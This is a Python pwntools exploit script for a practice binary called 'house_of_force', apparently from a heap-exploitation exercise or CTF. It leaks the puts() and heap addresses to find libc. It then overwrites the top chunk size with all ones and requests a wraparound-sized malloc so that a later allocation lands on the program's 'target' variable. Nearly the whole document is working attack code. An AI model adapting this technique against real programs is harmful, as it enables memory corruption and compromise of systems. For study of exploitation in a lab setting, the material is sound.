#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.bits = 64
gs = '''
continue
'''

elf = context.binary = ELF('./house_of_force')

libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again
rop = ROP(elf)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

# to leak the address of puts(), use it to resolve the libc load address
r.recvuntil(b"puts() @ ")
libc.address = int(r.recvline(), 16) - libc.sym.puts

# this leaks the heap start address
r.recvuntil(b"heap @ ")
heap = int(r.recvline(), 16)
r.recvuntil(b"> ")
r.timeout = 0.1

# select malloc option
def malloc(size, data):
    r.sendlineafter(b">", b"1")
    r.sendlineafter(b":", f"{size}".encode())
    r.sendlineafter(b":", data)
    r.recvuntil(b"> ")

# calulate the wraparound distance between two addresses. A start and end address
def delta(x, y):
    return(0xffffffffffffffff - x) + y

# the heap variable holds heap star address
log.info(f"heap: 0x{heap:02x}")

# program symbols are available via "elf.sym.<symbol name>"
log.info(f"target: 0x{elf.sym.target:02x}")

# the malloc() function chooses option 1 from the menu
# its arguments are "size" and "data"
malloc(24, b"A"*24 + p64(0xffffffffffffffff))
distance = delta(heap +  0x20, elf.sym.target - 0x20)
malloc(distance, "A")
malloc(24, "HELLO WORLD")

# the delta() function finds the "wraparound" distance between two addresses
log.info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")

#============= interactive ================

r.interactive()
